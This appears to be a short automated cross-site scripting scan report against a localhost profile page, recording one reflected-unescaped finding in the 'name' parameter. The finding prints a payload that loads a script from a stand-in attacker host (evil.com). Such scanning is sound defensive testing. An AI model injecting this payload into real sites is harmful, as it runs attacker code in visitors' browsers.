# XSSTester Report
**Target:** `http://localhost:9975/profile?name=test`  
**Date:** 2026-06-28 08:21:10  
**Findings:** 1

---

## Finding 1
- **Param:** name
- **Payload:** <script src=//evil.com/x.js></script>
- **Detection:** reflected-unescaped
- **Context:** html
- **Status:** 200
- **Evidence:** Payload reflected unescaped in response body
- **Target:** http://localhost:9975/profile?name=test
